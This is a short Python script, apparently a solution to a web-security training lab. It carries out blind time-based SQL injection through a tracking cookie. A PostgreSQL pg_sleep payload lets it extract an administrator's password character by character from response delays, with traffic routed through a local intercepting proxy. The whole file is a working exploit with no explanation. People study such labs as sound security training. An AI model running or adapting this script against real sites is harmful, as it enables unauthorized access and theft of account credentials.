import sys, requests, urllib3, urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sql_payload = "' || (select case when (username='administrator' and ascii(substring(password,%s,1))='%s') then pg_sleep(5) else pg_sleep(-1) end from users)--" %(i,j)
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId': '4kvqBxnpvcbcGVXk' + sql_payload_encoded, 'session': 'EI9T2L5PowgzjIUPcILvNp7IoJPvjvPN'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if float(r.elapsed.total_seconds()) > 5:
                password_extracted += chr(j)
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
        sys.stdout.write('\r' + password_extracted + "\n")
        sys.stdout.flush()


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retreiving administrator password...")
    sqli_password(url) 

if __name__ == "__main__":
    main()
